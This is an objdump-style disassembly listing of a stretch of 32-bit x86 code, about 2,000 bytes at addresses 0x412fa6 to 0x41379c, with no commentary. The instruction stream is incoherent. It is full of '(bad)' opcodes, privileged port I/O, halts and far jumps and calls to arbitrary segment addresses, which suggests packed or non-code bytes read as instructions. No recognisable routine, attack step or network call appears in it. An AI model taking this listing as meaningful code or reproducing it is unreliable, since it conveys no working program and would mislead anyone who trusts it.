  412fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa7:	retf   0xfb2e
  412faa:	out    dx,eax
  412fab:	mov    WORD PTR [edi-0x41e7b1db],?
  412fb1:	xor    BYTE PTR [esi+edi*8+0x44f44c2d],0x5f
  412fb9:	sbb    dl,bh
  412fbb:	sbb    eax,0xd9b2f0dd
  412fc0:	or     cl,BYTE PTR [ebx]
  412fc2:	xchg   ecx,eax
  412fc3:	xchg   edx,eax
  412fc4:	iret   
  412fc5:	jns    0x413014
  412fc7:	stos   DWORD PTR es:[edi],eax
  412fc8:	xchg   esp,eax
  412fc9:	mov    esi,0x5ee67358
  412fce:	ds popf 
  412fd0:	popa   
  412fd1:	rol    BYTE PTR [eax],cl
  412fd3:	std    
  412fd4:	inc    esi
  412fd5:	bound  ebp,QWORD PTR ds:0x9d2c8477
  412fdb:	cmp    BYTE PTR [ebx],0x28
  412fde:	push   ecx
  412fdf:	pop    ebx
  412fe0:	inc    ebp
  412fe1:	jmp    0xb09fbf97
  412fe6:	add    eax,0x191dbccf
  412feb:	int3   
  412fec:	int    0x10
  412fee:	sahf   
  412fef:	popa   
  412ff0:	mov    al,BYTE PTR [esi]
  412ff2:	mov    al,0x91
  412ff4:	push   0xffffff9c
  412ff6:	jmp    DWORD PTR [edi-0x2283669f]
  412ffc:	cmp    edi,DWORD PTR [esi+edi*2]
  412fff:	das    
  413000:	jae    0x412ff7
  413002:	mov    al,ds:0x787f4dd1
  413007:	repnz fdiv st(4),st
  41300a:	loop   0x413074
  41300c:	sbb    DWORD PTR [ebx-0x65d2f6ed],eax
  413012:	sahf   
  413013:	mov    eax,edx
  413015:	rol    BYTE PTR [ebx],1
  413017:	sbb    al,0x80
  413019:	shr    DWORD PTR [ebx+esi*4],1
  41301c:	fistp  WORD PTR [eax+0x75]
  41301f:	xchg   ecx,eax
  413020:	faddp  st(7),st
  413022:	icebp  
  413023:	mov    ebp,0x8faab64f
  413028:	test   ch,bl
  41302a:	outs   dx,BYTE PTR ds:[esi]
  41302b:	rcl    ebx,0x12
  41302e:	lods   eax,DWORD PTR ds:[esi]
  41302f:	sub    BYTE PTR [edi+0x5279f7ce],al
  413035:	mov    esi,0xecaeb03a
  41303a:	mov    al,ds:0x4559f02f
  41303f:	(bad)  
  413041:	sti    
  413042:	push   ss
  413043:	dec    eax
  413044:	push   0x29
  413046:	adc    eax,0x95706bf0
  41304b:	add    dl,BYTE PTR [edi-0x2d1730a]
  413051:	cld    
  413052:	out    dx,eax
  413053:	cmp    eax,DWORD PTR [esp+esi*8-0x41]
  413057:	pushf  
  413058:	repz inc ebx
  41305a:	sbb    BYTE PTR [esi],bh
  41305c:	shl    edx,cl
  41305e:	push   ss
  41305f:	sub    ah,BYTE PTR [esi-0x4b14e6bf]
  413065:	popa   
  413066:	push   edi
  413067:	gs test eax,0x428ede40
  41306d:	sub    ebp,eax
  41306f:	xor    edi,DWORD PTR ds:0xd925f4cf
  413075:	mov    esi,0xfdac8356
  41307a:	inc    ecx
  41307b:	mov    esp,DWORD PTR [edx-0xb116be3]
  413081:	inc    edi
  413082:	add    esi,edx
  413084:	scas   al,BYTE PTR es:[edi]
  413085:	shl    DWORD PTR [eax+0x4fbce92c],1
  41308b:	push   ebp
  41308c:	(bad)  
  41308d:	enter  0xc66f,0x1c
  413091:	call   0x30eab4df
  413096:	dec    esi
  413097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413098:	cmovno esp,DWORD PTR [esi-0x6c]
  41309c:	xchg   ebp,eax
  41309d:	jmp    0x41308d
  41309f:	jno    0x413108
  4130a1:	mov    ebp,0xb728650f
  4130a6:	inc    ebx
  4130a7:	test   eax,0x3f853607
  4130ac:	fistp  WORD PTR [ebx+0x23ba2556]
  4130b2:	bound  eax,QWORD PTR [esi]
  4130b4:	inc    ebp
  4130b5:	enter  0xf1e,0x81
  4130b9:	and    esi,DWORD PTR [ebp+0x576f1c60]
  4130bf:	pop    eax
  4130c0:	loope  0x4130b5
  4130c2:	test   BYTE PTR [ecx-0x1a71cd7b],0xe6
  4130c9:	ss ins BYTE PTR es:[edi],dx
  4130cb:	push   es
  4130cc:	lods   al,BYTE PTR ds:[esi]
  4130cd:	test   eax,0xd230b7e5
  4130d2:	lahf   
  4130d3:	push   DWORD PTR [ebp+0x15]
  4130d6:	xchg   edi,eax
  4130d7:	outs   dx,BYTE PTR ds:[esi]
  4130d8:	mov    esi,0xd63a8db
  4130dd:	xchg   edi,eax
  4130de:	aam    0x99
  4130e0:	dec    esp
  4130e1:	cmp    DWORD PTR ds:0xa798,edi
  4130e6:	test   BYTE PTR [ebp+0x1bb5c825],0x3a
  4130ed:	pop    ebp
  4130ee:	int3   
  4130ef:	out    dx,eax
  4130f0:	pushf  
  4130f1:	xor    esi,ecx
  4130f3:	xchg   edi,eax
  4130f4:	dec    edx
  4130f5:	mov    eax,0x7275f3f2
  4130fa:	sti    
  4130fb:	icebp  
  4130fc:	mov    ?,eax
  4130fe:	and    esp,DWORD PTR [ecx+eax*2]
  413101:	enter  0x3086,0xad
  413105:	lods   eax,DWORD PTR ds:[esi]
  413106:	(bad)  
  413107:	out    0xb5,al
  413109:	cmp    al,0x7e
  41310b:	hlt    
  41310c:	outs   dx,DWORD PTR ds:[esi]
  41310d:	sahf   
  41310e:	into   
  41310f:	std    
  413110:	pop    esp
  413111:	xchg   BYTE PTR [eax-0x4b879508],cl
  413117:	adc    DWORD PTR [esi+0x32],ecx
  41311a:	sbb    eax,0x5aa9ffaa
  41311f:	adc    ebp,esi
  413121:	adc    BYTE PTR [edx+edi*1-0x4d],al
  413125:	fmul   DWORD PTR [edi-0xb]
  413128:	inc    ecx
  413129:	fnstcw WORD PTR [ecx-0x78]
  41312c:	das    
  41312d:	jns    0x4130d5
  41312f:	out    0x4e,eax
  413131:	(bad)  
  413132:	lods   al,BYTE PTR ds:[esi]
  413133:	mov    ?,WORD PTR [ebp+0x18986bf3]
  413139:	nop
  41313a:	sbb    eax,0xa2b0f492
  41313f:	popa   
  413140:	jl     0x41311d
  413142:	and    DWORD PTR [edi-0x24],0xffffffbd
  413146:	cmp    BYTE PTR [ebp-0x58],dl
  413149:	jge    0x4131c8
  41314b:	jnp    0x413148
  41314d:	xchg   DWORD PTR [edx+0x6c],eax
  413150:	mov    dh,BYTE PTR [ecx]
  413152:	fstp   DWORD PTR [edi-0x2e]
  413155:	retf   0xd968
  413158:	cmp    BYTE PTR [esi-0x51],dl
  41315b:	lock jmp 0xd7c12805
  413161:	and    esp,DWORD PTR [edx]
  413163:	xor    eax,edx
  413165:	add    dh,ah
  413167:	sub    ebx,edi
  413169:	into   
  41316a:	mov    ebx,0x5d5e660e
  41316f:	fnstcw WORD PTR [ecx-0x1a]
  413172:	loope  0x41317d
  413174:	jno    0x4131b2
  413176:	inc    edi
  413177:	sbb    DWORD PTR [esi-0x53],eax
  41317a:	ins    DWORD PTR es:[edi],dx
  41317b:	dec    ebp
  41317c:	imul   esi,DWORD PTR [edx-0x10],0x9e7411e4
  413183:	or     al,0x47
  413185:	cld    
  413186:	es xchg esp,eax
  413188:	dec    edx
  413189:	or     dl,BYTE PTR [edx]
  41318b:	xchg   ecx,eax
  41318c:	push   eax
  41318d:	and    eax,0x185a607f
  413192:	les    ebx,FWORD PTR [ecx]
  413194:	and    BYTE PTR [ecx+0x7d],cl
  413197:	sbb    edx,esi
  413199:	pop    es
  41319a:	dec    eax
  41319b:	jbe    0x4131bc
  41319d:	pop    edi
  41319e:	ds xchg edi,eax
  4131a0:	xor    eax,0x5f51d453
  4131a5:	dec    edi
  4131a6:	mov    edx,0x9a56acd6
  4131ab:	hlt    
  4131ac:	ins    BYTE PTR es:[edi],dx
  4131ad:	mov    ?,WORD PTR [ecx+0x1f]
  4131b0:	aas    
  4131b1:	or     eax,0x212cae99
  4131b6:	mov    cs,WORD PTR [esi+ecx*2-0x61]
  4131ba:	sbb    eax,0xeba3a7b6
  4131bf:	mov    ebp,0x18595c91
  4131c4:	dec    eax
  4131c5:	sbb    DWORD PTR [eax+0x2db126fa],ebp
  4131cb:	call   0x60f2aaa0
  4131d0:	(bad)  
  4131d1:	mov    ebp,0xa66dd05d
  4131d6:	les    edi,FWORD PTR [eax]
  4131d8:	or     BYTE PTR [esi],bh
  4131da:	mov    eax,0x3d38acee
  4131df:	lods   al,BYTE PTR ds:[esi]
  4131e0:	ins    DWORD PTR es:[edi],dx
  4131e1:	(bad)  
  4131e2:	call   0x5822ceb7
  4131e7:	xchg   esp,eax
  4131e8:	mov    eax,ds:0x3e21e0ff
  4131ed:	add    eax,0x1b3a8a93
  4131f2:	pop    ss
  4131f3:	cmp    eax,0x2bf25930
  4131f8:	pop    esi
  4131f9:	mov    esp,0xece32235
  4131fe:	jecxz  0x41324d
  413200:	rcr    BYTE PTR ds:0x8d1ee81f,cl
  413206:	inc    esi
  413207:	hlt    
  413208:	fcmovne st,st(1)
  41320a:	popa   
  41320b:	mov    edx,0x99b53aa3
  413210:	mov    ebp,0x6d1da3c2
  413215:	jb     0x4131f7
  413217:	test   BYTE PTR [eax+0x4343a423],ah
  41321d:	imul   eax,DWORD PTR [ebx+0x5f7a74ec],0x10
  413224:	push   esi
  413225:	cmc    
  413226:	rcr    DWORD PTR [edx-0x2d],1
  413229:	data16 loope 0x413207
  41322c:	ror    BYTE PTR [edi+0xb942052],0x79
  413233:	mov    ch,0xc9
  413235:	lods   al,BYTE PTR ds:[esi]
  413236:	pop    edi
  413237:	adc    eax,0xdc385ea7
  41323c:	repz test al,0xa2
  41323f:	stos   BYTE PTR es:[edi],al
  413240:	mov    DWORD PTR [eax],esi
  413242:	and    BYTE PTR [ebp-0x1b],bl
  413245:	das    
  413246:	xor    BYTE PTR [edx-0xb],bl
  413249:	sbb    ah,BYTE PTR [edx+0x4aed080a]
  41324f:	out    0xfa,eax
  413251:	test   eax,0x152220b6
  413256:	jmp    0x413252
  413258:	jge    0x413292
  41325a:	call   0x2b1b:0x6bf5b783
  413261:	lods   al,BYTE PTR ds:[esi]
  413262:	pop    esi
  413263:	jbe    0x413287
  413265:	pop    edi
  413266:	jae    0x413209
  413268:	and    al,0xbb
  41326a:	or     al,0x95
  41326c:	test   eax,0x599f89d9
  413271:	xchg   ebx,eax
  413272:	add    DWORD PTR [edi+0x72],esi
  413275:	arpl   cx,dx
  413277:	mov    ch,0xe5
  413279:	cli    
  41327a:	lahf   
  41327b:	cmp    BYTE PTR [edi+0x9],ch
  41327e:	fs mov ebx,0x7291c05d
  413284:	mov    bh,0x4f
  413286:	ret    
  413287:	in     al,dx
  413288:	or     eax,0x3632a1ee
  41328d:	out    dx,eax
  41328e:	fiadd  DWORD PTR [eax-0x47]
  413291:	sbb    ebx,DWORD PTR [eax-0x5a4d7f48]
  413297:	leave  
  413298:	or     ecx,ecx
  41329a:	xchg   edx,eax
  41329b:	pop    ss
  41329c:	push   edi
  41329d:	pushf  
  41329e:	push   ds
  41329f:	test   al,0xa3
  4132a1:	inc    ebp
  4132a2:	dec    edx
  4132a3:	push   0x7b
  4132a5:	call   0x5342e253
  4132aa:	adc    esi,DWORD PTR [esi-0x402563b5]
  4132b0:	adc    bh,ah
  4132b2:	inc    esi
  4132b3:	push   es
  4132b4:	and    al,0x5d
  4132b6:	inc    ebx
  4132b7:	xchg   edi,eax
  4132b8:	retf   
  4132b9:	in     al,dx
  4132ba:	sub    edx,DWORD PTR ds:0x4346a3fb
  4132c0:	ins    BYTE PTR es:[edi],dx
  4132c1:	ins    DWORD PTR es:[edi],dx
  4132c2:	mov    ch,0x27
  4132c4:	jge    0x413297
  4132c6:	cwde   
  4132c7:	ret    
  4132c8:	pop    ebp
  4132c9:	cmp    BYTE PTR [edx+0x728d393],cl
  4132cf:	and    eax,0xf3536263
  4132d4:	sub    BYTE PTR [eax-0x7990ad59],ah
  4132da:	xchg   edx,eax
  4132db:	push   cs
  4132dc:	mov    ds:0xf564e206,al
  4132e1:	push   ss
  4132e2:	addr16 sahf 
  4132e4:	xor    eax,0x2b5d1b39
  4132e9:	inc    esi
  4132ea:	pushf  
  4132eb:	int3   
  4132ec:	dec    eax
  4132ed:	(bad)  
  4132ee:	sti    
  4132ef:	stos   DWORD PTR es:[edi],eax
  4132f0:	aam    0xe4
  4132f2:	pop    edx
  4132f3:	xchg   BYTE PTR [ecx-0x5b],dl
  4132f6:	or     DWORD PTR [esi+0x3454f61d],ebp
  4132fc:	or     BYTE PTR [esp+ebp*2],cl
  4132ff:	sub    ah,bh
  413301:	jne    0x413358
  413303:	iret   
  413304:	and    al,0x74
  413306:	jnp    0x413318
  413308:	mov    ds:0x4f14dbfc,al
  41330d:	mov    al,0x3e
  41330f:	addr16 pop eax
  413311:	push   edi
  413312:	(bad)  
  413313:	outs   dx,DWORD PTR ds:[esi]
  413314:	mov    ecx,0x63395f0
  413319:	push   edi
  41331a:	inc    eax
  41331b:	lods   al,BYTE PTR ds:[esi]
  41331c:	lahf   
  41331d:	and    ebx,DWORD PTR ds:0x2cdc5a6
  413323:	and    ah,bl
  413325:	mov    edx,0xf9d8df9
  41332a:	jl     0x4132b3
  41332c:	and    ah,BYTE PTR [ecx]
  41332e:	retf   
  41332f:	mov    esp,0xe1cae6c4
  413334:	push   edi
  413335:	jnp    0x413330
  413337:	fild   WORD PTR [ebx]
  413339:	hlt    
  41333a:	aaa    
  41333b:	lahf   
  41333c:	repnz fs and eax,0xc0622919
  413343:	inc    ecx
  413344:	inc    eax
  413345:	jmp    0xc59fe61e
  41334a:	aas    
  41334b:	add    al,0x52
  41334d:	sbb    eax,0x80b211e3
  413352:	jnp    0x4133ab
  413354:	jmp    0xec34:0xbd03cd9f
  41335b:	xchg   BYTE PTR es:[ecx],dh
  41335e:	sbb    al,0x12
  413360:	pop    ds
  413361:	mov    ss,WORD PTR [ecx+0x7c]
  413364:	test   al,0x63
  413366:	in     al,dx
  413367:	fstp   QWORD PTR [esi+0x1d]
  41336a:	arpl   WORD PTR [esi-0x16],sp
  41336d:	jo     0x4132ff
  41336f:	pop    es
  413370:	add    BYTE PTR [edx],cl
  413372:	mov    edx,0xbb70502c
  413377:	cdq    
  413378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413379:	jo     0x413315
  41337b:	and    DWORD PTR [ebp-0x75],esi
  41337e:	loope  0x413381
  413380:	sub    BYTE PTR [esi+0xde67363],cl
  413386:	mov    BYTE PTR [eax-0x770a99b],ah
  41338c:	sahf   
  41338d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41338e:	pop    esi
  41338f:	sar    DWORD PTR [ebx-0x4e70d86a],0xd
  413396:	dec    esp
  413397:	pop    edi
  413398:	or     eax,DWORD PTR ds:0xd2d32238
  41339e:	jmp    0x4133e8
  4133a0:	mov    ds:0x4033e86b,al
  4133a5:	xor    eax,DWORD PTR [esi]
  4133a7:	cmp    eax,0x26ed8d0
  4133ac:	jno    0x413374
  4133ae:	ins    BYTE PTR es:[edi],dx
  4133af:	mov    esi,0xdb2baf5
  4133b4:	xor    eax,0xfea55101
  4133b9:	cmp    al,ah
  4133bb:	pop    ebx
  4133bc:	aam    0x2
  4133be:	popa   
  4133bf:	xchg   esp,eax
  4133c0:	aad    0x99
  4133c2:	ja     0x4133df
  4133c4:	outs   dx,BYTE PTR ds:[esi]
  4133c5:	xchg   edi,eax
  4133c6:	mov    dl,0x72
  4133c8:	push   ecx
  4133c9:	xchg   edx,eax
  4133ca:	mov    cl,0xb1
  4133cc:	push   0x98a1d685
  4133d1:	sub    al,0xc4
  4133d3:	dec    edx
  4133d4:	sbb    ah,BYTE PTR [eax+0x65bbb1]
  4133da:	mov    bh,0xda
  4133dc:	cmc    
  4133dd:	out    dx,al
  4133de:	sti    
  4133df:	popf   
  4133e0:	hlt    
  4133e1:	outs   dx,BYTE PTR ds:[esi]
  4133e2:	ror    DWORD PTR ds:0xf0c1cb82,0x90
  4133e9:	sbb    ch,BYTE PTR [eax-0x3a0ff787]
  4133ef:	add    al,0xbb
  4133f1:	pop    eax
  4133f2:	xchg   esp,eax
  4133f3:	pop    ebx
  4133f4:	imul   BYTE PTR [edi]
  4133f6:	inc    esi
  4133f7:	lock div DWORD PTR [eax]
  4133fa:	adc    BYTE PTR [ebp+0x59],0x29
  4133fe:	add    BYTE PTR [esi-0x4450417d],dh
  413404:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  413406:	shr    dl,0x5
  413409:	data16 sub al,0x26
  41340c:	out    0x2e,al
  41340e:	lahf   
  41340f:	mov    ebp,0xd93cd5cb
  413414:	inc    ebp
  413415:	rol    BYTE PTR [eax-0x1886c116],1
  41341b:	gs mov dh,0x15
  41341e:	fdiv   QWORD PTR [esi+0x6c80316d]
  413424:	test   eax,0x3028568d
  413429:	inc    esp
  41342a:	mov    dh,0xc7
  41342c:	inc    eax
  41342d:	add    DWORD PTR [edi-0x79e2207f],ebx
  413433:	jge    0x4133c3
  413435:	clc    
  413436:	adc    al,0x54
  413438:	pop    ss
  413439:	pusha  
  41343a:	jb     0x413453
  41343c:	push   edi
  41343d:	or     esi,DWORD PTR [ebx]
  41343f:	adc    DWORD PTR [esi],edi
  413441:	push   edi
  413442:	inc    esp
  413443:	lahf   
  413444:	inc    ebp
  413445:	(bad)
  413449:	dec    edx
  41344a:	scas   al,BYTE PTR es:[edi]
  41344b:	mov    esp,0x610df222
  413450:	dec    edx
  413451:	into   
  413452:	pop    ebx
  413453:	nop
  413454:	xchg   BYTE PTR [ecx-0x4d],dl
  413457:	(bad)  
  413458:	xlat   BYTE PTR ds:[ebx]
  413459:	jmp    0x413435
  41345b:	xor    eax,0xba14cdf6
  413460:	pop    edx
  413461:	xor    eax,0x68d0556e
  413466:	loop   0x41348a
  413468:	jg     0x4134bb
  41346a:	sub    dl,BYTE PTR [eax-0x6e]
  41346d:	fidivr WORD PTR [ecx+0x2ebb1f13]
  413473:	arpl   cx,bp
  413475:	retf   
  413476:	pop    ss
  413477:	lahf   
  413478:	leave  
  413479:	mov    ebx,ebx
  41347b:	imul   esp,esi,0x19
  41347e:	mov    WORD PTR [ebx+0x30],cs
  413481:	out    dx,eax
  413482:	push   ds
  413483:	sbb    al,0xd6
  413485:	pop    ss
  413486:	pop    ebp
  413487:	cmp    dl,BYTE PTR [edx-0x44]
  41348a:	xchg   edx,eax
  41348b:	lock cli 
  41348d:	mov    al,ds:0x62b3d880
  413492:	test   eax,0xa193dc41
  413498:	fst    st(0)
  41349a:	push   eax
  41349b:	add    BYTE PTR [eax],ah
  41349d:	rcr    BYTE PTR [ecx+0x1de35e72],cl
  4134a3:	lods   eax,DWORD PTR ds:[esi]
  4134a4:	pusha  
  4134a5:	sbb    dh,BYTE PTR [eax+edx*4+0x21b0f582]
  4134ac:	pop    ds
  4134ad:	out    dx,al
  4134ae:	pop    edi
  4134af:	pop    edx
  4134b0:	mov    ah,0x58
  4134b2:	mov    ecx,0x35df981f
  4134b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b8:	xor    eax,DWORD PTR [ecx-0x7b]
  4134bb:	fs jns 0x4134c3
  4134be:	pop    edi
  4134bf:	test   dl,ah
  4134c1:	cld    
  4134c2:	push   ebx
  4134c3:	fsubr  QWORD PTR [eax]
  4134c5:	pop    esi
  4134c6:	push   ebx
  4134c7:	pop    esp
  4134c8:	mov    esi,0x896bc02a
  4134cd:	loopne 0x4134cc
  4134cf:	pop    ebp
  4134d0:	cmp    bh,ah
  4134d2:	lds    eax,FWORD PTR [edi+0x18]
  4134d5:	hlt    
  4134d6:	arpl   WORD PTR [esi+0x7a2f4038],ax
  4134dc:	or     DWORD PTR [eax+0x25],esi
  4134df:	(bad)  
  4134e0:	fadd   st,st(5)
  4134e2:	(bad)  
  4134e3:	sbb    BYTE PTR [edi],ch
  4134e5:	lock jns 0x4134fc
  4134e8:	cli    
  4134e9:	shl    DWORD PTR [edx],0xa7
  4134ec:	mov    esp,0xb106740
  4134f1:	not    BYTE PTR [edi]
  4134f3:	adc    edx,esi
  4134f5:	cdq    
  4134f6:	outs   dx,DWORD PTR ds:[esi]
  4134f7:	mov    ch,0xa7
  4134f9:	mov    al,ds:0x18c7ba0a
  4134fe:	leave  
  4134ff:	stos   BYTE PTR es:[edi],al
  413500:	je     0x413528
  413502:	cmp    al,0x34
  413504:	mov    ch,0xcf
  413506:	rol    BYTE PTR [edi],0xa9
  413509:	mov    bl,0x56
  41350b:	(bad)  
  41350c:	xchg   ebp,eax
  41350d:	jmp    0xe189:0xa23034e7
  413514:	fmulp  st(2),st
  413516:	ins    DWORD PTR es:[edi],dx
  413517:	call   0xd09c:0x188dadb7
  41351e:	ficom  DWORD PTR [edi-0x37]
  413521:	xor    bh,BYTE PTR [ebx]
  413523:	test   DWORD PTR ds:0xf0a42560,edi
  413529:	int3   
  41352a:	inc    esi
  41352b:	and    DWORD PTR [edi+0x2a],ebp
  41352e:	or     al,0xf0
  413530:	xchg   esp,ecx
  413532:	dec    ebx
  413533:	pop    ebx
  413534:	mov    al,ds:0x58d843cb
  413539:	call   0x4db4:0x2e388722
  413540:	add    eax,DWORD PTR [ecx]
  413542:	out    0xc,eax
  413544:	fwait
  413545:	lea    edx,[edx-0x1b365226]
  41354b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41354c:	daa    
  41354d:	dec    edx
  41354e:	jmp    0xbbb08b4b
  413553:	xor    dh,0xe
  413556:	push   ss
  413557:	mov    eax,0x57e6cf10
  41355c:	nop
  41355d:	mov    ebx,0xd8cf68f9
  413562:	je     0x41359c
  413564:	sub    BYTE PTR [esp+ecx*1],al
  413567:	repz rcl bh,0x75
  41356b:	aas    
  41356c:	dec    esi
  41356d:	push   ebp
  41356e:	out    0xec,eax
  413570:	sub    ebx,DWORD PTR [eax]
  413572:	mov    ecx,0x8cb76833
  413577:	popf   
  413578:	pusha  
  413579:	daa    
  41357a:	sub    BYTE PTR ds:0x8828dca4,al
  413580:	mov    edi,0xcacb78b1
  413585:	enter  0x774e,0xdc
  413589:	mov    esi,0x6fa30fff
  41358e:	xchg   edx,eax
  41358f:	inc    ebp
  413590:	lods   al,BYTE PTR ds:[esi]
  413591:	cwde   
  413592:	inc    edx
  413593:	ds jne 0x413579
  413596:	inc    ecx
  413597:	loopne 0x4135bb
  413599:	ss push ebx
  41359b:	pusha  
  41359c:	xchg   esp,eax
  41359d:	shr    DWORD PTR [ebp+0x27],0xa8
  4135a1:	push   0x2e30bca5
  4135a6:	pusha  
  4135a7:	sbb    ch,BYTE PTR [esi]
  4135a9:	ds bswap esp
  4135ac:	out    0xd8,al
  4135ae:	add    eax,0xc737e725
  4135b3:	mov    bh,0x66
  4135b5:	push   esi
  4135b6:	retf   
  4135b7:	jb     0x4135c1
  4135b9:	sub    esi,DWORD PTR [edx-0x20]
  4135bc:	add    DWORD PTR [ebx+0x2e],0xffffffdd
  4135c0:	jno    0x4135c9
  4135c2:	fwait
  4135c3:	jne    0x4135ca
  4135c5:	addr16 (bad) 
  4135c8:	stc    
  4135c9:	call   0xa6ddf957
  4135ce:	jb     0x4135cf
  4135d0:	lds    edx,FWORD PTR [eax+0x5c]
  4135d3:	hlt    
  4135d4:	xchg   esi,eax
  4135d5:	rcl    DWORD PTR [esi+edx*4],cl
  4135d8:	cmp    edi,ebp
  4135da:	mov    ds:0x9f09847d,al
  4135df:	sub    bl,BYTE PTR [ecx]
  4135e1:	je     0x413569
  4135e3:	jg     0x413574
  4135e5:	push   cs
  4135e6:	mov    bh,BYTE PTR [eax+eax*4]
  4135e9:	sub    DWORD PTR cs:0xc5c8b940,esi
  4135f0:	and    al,0xfd
  4135f2:	lds    esp,FWORD PTR [ecx]
  4135f4:	sub    BYTE PTR [eax+eiz*4-0x6e],bl
  4135f8:	mov    edx,0x1d07fd71
  4135fd:	xor    bl,bl
  4135ff:	lds    ebp,FWORD PTR [ebx]
  413601:	fisttp WORD PTR [esi-0x65]
  413604:	fidivr DWORD PTR [edx+0x29]
  413607:	add    al,0x5f
  413609:	mov    BYTE PTR ds:0x25bc5f46,al
  41360f:	(bad)  
  413610:	mov    ebx,0x7775f840
  413615:	and    al,0x53
  413617:	pushf  
  413618:	mov    al,0x3b
  41361a:	leave  
  41361b:	lods   eax,DWORD PTR ds:[esi]
  41361c:	inc    eax
  41361d:	loopne 0x413634
  41361f:	xchg   BYTE PTR [edx-0xe],dl
  413622:	sbb    al,0x1
  413624:	loope  0x41363b
  413626:	test   BYTE PTR [ebp+0x2],dl
  413629:	jo     0x41366f
  41362b:	outs   dx,DWORD PTR ds:[esi]
  41362c:	int3   
  41362d:	js     0x413659
  41362f:	xchg   ecx,eax
  413630:	xchg   esp,eax
  413631:	add    DWORD PTR [edi],ebp
  413633:	stos   BYTE PTR es:[edi],al
  413634:	pop    ss
  413635:	xor    dh,BYTE PTR ds:0x561d56ba
  41363b:	or     DWORD PTR [edx+eiz*4+0x3fba9a45],edi
  413642:	push   ds
  413643:	pop    ds
  413644:	outs   dx,BYTE PTR ds:[esi]
  413645:	sbb    esi,DWORD PTR [eax-0x9]
  413648:	jbe    0x413688
  41364a:	gs pop edi
  41364c:	lock mov ebp,DWORD PTR [esp+edi*8]
  413650:	cmp    cl,BYTE PTR [ecx]
  413652:	push   cs
  413653:	cmp    ebp,DWORD PTR [edi*2+0x76eb7c0f]
  41365a:	pop    ecx
  41365b:	out    dx,al
  41365c:	sti    
  41365d:	add    esi,edx
  41365f:	sbb    DWORD PTR [eax],ebx
  413661:	mov    ecx,0x2f65553b
  413666:	loop   0x41364e
  413668:	add    DWORD PTR [eax+0x5ac5ac2a],ebx
  41366e:	stc    
  41366f:	jl     0x41368f
  413671:	(bad)  
  413672:	mov    cl,0x9b
  413674:	and    BYTE PTR [ebx+0x44465f25],dl
  41367a:	jbe    0x413619
  41367c:	and    eax,0x98b791eb
  413681:	icebp  
  413682:	sbb    dl,BYTE PTR [esi-0x80]
  413685:	(bad)  
  413686:	in     eax,dx
  413687:	shl    DWORD PTR [esi+0x20],1
  41368a:	ss jns 0x4136c2
  41368d:	gs retw 
  413690:	mov    edi,0x7d4e350a
  413695:	mov    ebp,0x124f204a
  41369a:	in     al,dx
  41369b:	icebp  
  41369c:	jo     0x4136d5
  41369e:	xchg   ebx,eax
  41369f:	lods   eax,DWORD PTR ds:[esi]
  4136a0:	jp     0x413655
  4136a2:	and    DWORD PTR [edx+0x5ec2a3c4],ebx
  4136a8:	(bad)  
  4136a9:	push   ecx
  4136aa:	leave  
  4136ab:	movnti DWORD PTR [esi],edi
  4136ae:	and    eax,0x74ec41e7
  4136b3:	sub    eax,0x574acf18
  4136b8:	call   0xe08c7ff0
  4136bd:	cmp    ah,BYTE PTR [edi+ecx*1+0x73eb3da9]
  4136c4:	and    ecx,DWORD PTR ds:0xdc7702af
  4136ca:	or     DWORD PTR [eax],ecx
  4136cc:	and    ch,bh
  4136ce:	and    DWORD PTR [eax-0x4f],eax
  4136d1:	and    eax,0x91395588
  4136d6:	mov    dh,0x6f
  4136d8:	or     cl,BYTE PTR [edi*1+0x4ed1b828]
  4136df:	add    DWORD PTR [ecx],edx
  4136e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136e2:	adc    eax,0x56de783d
  4136e7:	mov    al,0xdd
  4136e9:	cmp    eax,0x28b54347
  4136ee:	fst    DWORD PTR [edx-0x58]
  4136f1:	pop    ebp
  4136f2:	push   edx
  4136f3:	cmp    ebp,esp
  4136f5:	pushf  
  4136f6:	jecxz  0x413757
  4136f8:	jge    0x413756
  4136fa:	stos   BYTE PTR es:[edi],al
  4136fb:	nop
  4136fc:	retf   0xa0c1
  4136ff:	fs leave 
  413701:	jle    0x41373e
  413703:	or     eax,0x362735be
  413708:	rcr    DWORD PTR [ebp+0x7ad4f767],cl
  41370e:	mov    al,0x54
  413710:	and    ch,BYTE PTR [ebx-0x31fe4e5b]
  413716:	call   0x99a5:0xd1bf125a
  41371d:	lds    ebp,FWORD PTR [eax+esi*4-0x7e55e5d]
  413724:	mov    cl,0xa
  413726:	jae    0x41373e
  413728:	jmp    0x7808:0xabcb316f
  41372f:	dec    eax
  413730:	push   esi
  413731:	inc    edi
  413732:	loopne 0x413731
  413734:	add    BYTE PTR [edx+ebx*2+0x11eca67f],bh
  41373b:	das    
  41373c:	xor    al,0xec
  41373e:	adc    al,0x7e
  413740:	push   0x3f
  413742:	jne    0x4136f6
  413744:	inc    ebp
  413745:	mov    esi,0xc8bfea8c
  41374a:	dec    ebp
  41374b:	sbb    al,0x4
  41374d:	test   ah,dh
  41374f:	dec    eax
  413750:	jb     0x413728
  413752:	pushf  
  413753:	mov    WORD PTR [eax],fs
  413755:	xchg   esp,eax
  413756:	(bad)  
  413758:	jne    0x413718
  41375a:	repz enter 0x198,0x80
  41375f:	push   ecx
  413760:	mov    ecx,0xb2ab9a0c
  413765:	xor    eax,0xb4af9b0c
  41376a:	mov    bl,0x86
  41376c:	cmp    al,0xe3
  41376e:	mov    ecx,DWORD PTR [esi]
  413770:	dec    ebp
  413771:	fcom   DWORD PTR [ebx]
  413773:	cmp    bh,BYTE PTR [edx+0x18ab9536]
  413779:	xchg   edi,eax
  41377a:	les    esp,FWORD PTR [edx]
  41377c:	inc    esi
  41377d:	xor    esp,DWORD PTR [eax+ecx*1+0x3fd8a39e]
  413784:	scas   al,BYTE PTR es:[edi]
  413785:	or     al,0xa7
  413787:	lds    esp,FWORD PTR [edx-0x42]
  41378a:	clc    
  41378b:	add    eax,DWORD PTR [ecx-0x6d884bc3]
  413791:	rcl    DWORD PTR [eax+0x35],cl
  413794:	mov    bl,0xc2
  413796:	xor    DWORD PTR ds:0x530a7076,esp
  41379c:	(bad)  
